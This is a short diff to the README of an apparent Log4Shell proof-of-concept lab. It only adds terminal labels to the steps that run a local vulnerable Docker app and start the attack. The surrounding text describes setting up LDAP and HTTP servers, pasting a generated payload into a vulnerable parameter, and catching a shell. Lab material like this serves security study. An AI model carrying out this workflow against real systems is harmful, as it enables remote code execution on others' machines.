@@ -47,12 +47,12 @@ Listening on 0.0.0.0:1389
 ```
 This script will setup the HTTP server (not sure what the http is for, but whatevs) and the LDAP server for you, and it will also create the payload that you can use to paste into the vulnerable parameter. After this, if everything went well, you should get a shell on the lport.  
 
-Step 3) Our vulnerable application  
+Step 3) In Terminal 3, Our vulnerable application  
 ```c
 1: docker build -t log4j-shell-poc .
 2: docker run --network host log4j-shell-poc
 ```
-Step 4) Attack!  
+Step 4) In Terminal 4, Attack!  
 
 ```c
 curl http://127.0.0.1:8080 -v  | grep session  
